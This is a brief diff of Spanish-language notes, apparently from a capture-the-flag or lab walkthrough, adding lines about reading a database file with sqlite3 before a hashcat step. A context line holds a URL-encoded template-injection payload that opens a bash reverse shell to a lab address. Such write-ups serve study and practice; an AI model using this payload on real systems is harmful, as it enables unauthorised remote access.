@@ -52,8 +52,8 @@ de esta manera podemos tener acceso
 
 test%0A<%25%3d+system("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.8/9001+0>%261'")+%25>
 ### sqlite3
-tenemos 
+tenemos un archivo db que podemos leer con sqlite3
 ![[Pasted image 20240304130045.png]]
-
+###### conseguimos un archivo 
 ### hashcat
 ![[Pasted image 20240304130441.png]]
